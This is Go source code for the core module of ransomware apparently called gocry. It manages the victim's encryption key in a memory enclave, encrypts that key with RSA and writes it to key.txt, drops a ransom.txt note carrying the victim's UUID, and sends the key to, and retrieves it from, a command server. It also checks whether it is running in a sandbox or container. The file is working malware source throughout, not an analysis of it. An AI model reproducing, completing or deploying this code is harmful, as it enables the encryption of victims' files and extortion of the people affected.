package ransomware

import (
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/pem"
	"errors"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/awnumar/memguard"
	"github.com/nireo/gocry/config"
	"github.com/nireo/gocry/crypt"
	"github.com/nireo/gocry/utils"
	"github.com/nireo/gocry/victim"
	uuid "github.com/satori/go.uuid"
)

// Ransomware holds all the needed client information needed to go forward with the ransom.
type Ransomware struct {
	MemguardKey *memguard.Enclave
	PublicKey   string
	RootDir     string
	IP          string
	Data        *victim.VictimIndentifier
}

// CheckIfActiveRansom checks for any files with the .gocry extension such that then
// the ransomware knows not to re-ecrypt the files.
func (rw *Ransomware) CheckIfActiveRansom() error {
	if encrypted := checkIfEncrypted(rw.RootDir); encrypted {
		return errors.New("some files are already encrypted")
	}

	// check if ransom.txt and key.txt exists in the root directory.
	if _, err := os.Stat(rw.RootDir + "/key.txt"); !os.IsNotExist(err) {
		return errors.New("a key.txt already exists: " + err.Error())
	}

	if _, err := os.Stat(rw.RootDir + "/ransom.txt"); !os.IsNotExist(err) {
		return errors.New("a ransom.txt file already exists: " + err.Error())
	}

	return nil
}

// CreateTextFiles is responsible for creating the  ransom.txt. The message
// is taken as a parameter since it makes the main file look more clear and configurable.
func (rw *Ransomware) CreateRansomInfoFile(message string) error {
	file, err := os.Create(rw.RootDir + "/ransom.txt")
	if err != nil {
		return errors.New("could not create ransom.txt file: " + err.Error())
	}
	defer file.Close()

	if _, err := file.WriteString(fmt.Sprintf(message, rw.Data.UUID)); err != nil {
		return errors.New("could not write message to file: " + err.Error())
	}

	return nil
}

func checkIfEncrypted(rootPath string) bool {
	if err := filepath.Walk(rootPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		if info.IsDir() {
			return nil
		}

		if strings.HasSuffix(path, ".gocry") {
			return errors.New("a encrypted file has already been found")
		}

		return nil
	}); err != nil {
		return true
	}

	return false
}

// GetValidKeyFromServer sends a post request which contains the encryption key and then the
// server decrypts the key using the rsa private key and sends it back.
func (rw *Ransomware) GetValidKeyFromServer() error {
	key, err := ioutil.ReadFile(rw.RootDir + "/key.txt")
	if err != nil {
		return err
	}

	decryptedkey, err := rw.Data.GetKeyFromServer(key)
	if err != nil {
		return err
	}

	if err := rw.RemoveKeyFile(); err != nil {
		return err
	}

	if err := ioutil.WriteFile(rw.RootDir+"/key.txt", decryptedkey, 0600); err != nil {
		return err
	}

	return nil
}

// CheckIfValidMemSafeKey checks if the key inside the memguard enclave is the same as the key
// written inside of key.txt
func (rw *Ransomware) CheckIfValidMemSafeKey() bool {
	key, err := ioutil.ReadFile(rw.RootDir + "/key.txt")
	if err != nil {
		return false
	}

	b, err := rw.MemguardKey.Open()
	if err != nil {
		return false
	}
	defer b.Destroy()

	fmt.Println(key)
	fmt.Println(b.Bytes())

	if bytes.Equal(key, b.Bytes()) {
		return true
	}

	return false
}

// WriteMemSafeKey writes the encryption key to a file using a public key from the server.
// The key is passed through crypt.EncryptKey, whichs gets the public key and encrypts it as well.
func (rw *Ransomware) WriteMemSafeKey() error {
	b, err := rw.MemguardKey.Open()
	if err != nil {
		memguard.SafePanic(err)
	}
	defer b.Destroy()

	rsaEncryptedKey, err := crypt.EncryptKey(b.Bytes(), rw.Data.UUID)
	if err != nil {
		return err
	}

	if err := ioutil.WriteFile(rw.RootDir+"/key.txt", rsaEncryptedKey, 0600); err != nil {
		return err
	}

	return nil
}

// WriteKeyWithFile takes in a public key file so we don't need to fetch it from the server.
func (rw *Ransomware) WriteKeyWithFile(publicKey []byte) error {
	b, err := rw.MemguardKey.Open()
	if err != nil {
		memguard.SafePanic(err)
	}
	defer b.Destroy()

	block, _ := pem.Decode(publicKey)
	if block == nil {
		return fmt.Errorf("value not pem-encoded")
	}

	if got, want := block.Type, "PUBLIC KEY"; got != want {
		return fmt.Errorf("the public encryption key is of wrong type. got=%s, want=%s", got, want)
	}

	pubkey, err := x509.ParsePKCS1PublicKey(block.Bytes)
	if err != nil {
		return fmt.Errorf("bad public key: %s", err)
	}

	out, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, pubkey, b.Bytes(), []byte("key-"+rw.Data.UUID))
	if err != nil {
		return err
	}

	if err := ioutil.WriteFile(rw.RootDir+"/key.txt", out, 0600); err != nil {
		return err
	}

	return nil
}

// RemoveKeyFile removes the generated key file which holds the decryption key to the
// encrypted files.
func (rw *Ransomware) RemoveKeyFile() error {
	if err := os.Remove(rw.RootDir + "/key.txt"); err != nil {
		return err
	}

	return nil
}

// RemoveRansomFile removes the generated ransom file which notifies user that the computer
// is under ransom.
func (rw *Ransomware) RemoveRansomFile() error {
	if err := os.Remove(rw.RootDir + "/ransom.txt"); err != nil {
		return err
	}

	return nil
}

// SendKeyToServer sends the encryption key with rsa encryption to the server.
func (rw *Ransomware) SendKeyToServer() error {
	if err := utils.EncryptionKeyToServer(rw.MemguardKey, rw.Data.UUID); err != nil {
		return err
	}

	return nil
}

// Check if the ransomware is started in a container which allows all of the urls and ports.
func (rw *Ransomware) CheckIfInContainer() error {
	urlTest := uuid.NewV4()
	if _, err := http.Get("https://" + urlTest.String() + ":1234"); err != nil {
		return nil
	}
	return errors.New("in container")
}

// NewRansomware creates a new ransomware instance given a starting directory.
// This function automatically generates a 32-bit encryption key to encrypt files.
func NewRansomware() (*Ransomware, error) {
	key, err := utils.Gen32BitKey()
	if err != nil {
		return nil, err
	}

	return &Ransomware{
		RootDir:     config.GetConfig().RootDirectory,
		MemguardKey: memguard.NewEnclave(key),
		Data:        victim.NewVictimIndentifer(),
	}, nil
}
